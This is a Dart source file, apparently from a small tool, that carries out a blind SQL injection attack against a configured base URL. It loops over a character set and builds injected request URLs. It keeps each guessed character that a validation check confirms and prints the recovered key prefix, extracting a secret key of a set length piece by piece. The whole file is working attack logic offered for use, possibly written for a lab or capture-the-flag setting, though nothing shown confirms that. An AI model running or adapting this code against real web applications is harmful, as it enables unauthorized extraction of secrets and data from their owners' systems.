import 'attack/attack.dart';
import 'attack_url/make_attack_url.dart';
import 'constants.dart';
import 'range.dart';

const chars = 'aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ'
    '1234567890'
    '!@\$^*()';
final characters = chars.split('');

/// Conducts the SQLi attack using the given [attack] method on the given [range] of the key.
///
/// If the obtained string has the expected length, it is returned.
/// Otherwise, null is returned.
Future<String?> blindRangeSqlAttack(Attack attack, {Range range = (0, 33)}) async {
  final (from, to) = range;
  final testRangeLength = range.length;

  var successfulKeyPart = '';

  for (var i = from; i < to; i++) {
    for (final char in characters) {
      if (successfulKeyPart.length == testRangeLength) {
        return successfulKeyPart;
      }

      final attemptKeyPart = successfulKeyPart + char;
      final attackUrl = makeAttackUrl(
        baseUrl: baseUrl,
        sqlRequest: attack.sqlRequest,
        attemptKeyPart: attemptKeyPart,
        keyPartRange: range,
      );

      final isSuccessful = await attack.makeValidatedGuess(
        url: attackUrl,
        attemptKeyPattern: attemptKeyPart,
      );

      if (!isSuccessful) {
        continue;
      }

      successfulKeyPart = attemptKeyPart;
      print(successfulKeyPart);
    }
  }

  return successfulKeyPart.length == testRangeLength ? successfulKeyPart : null;
}
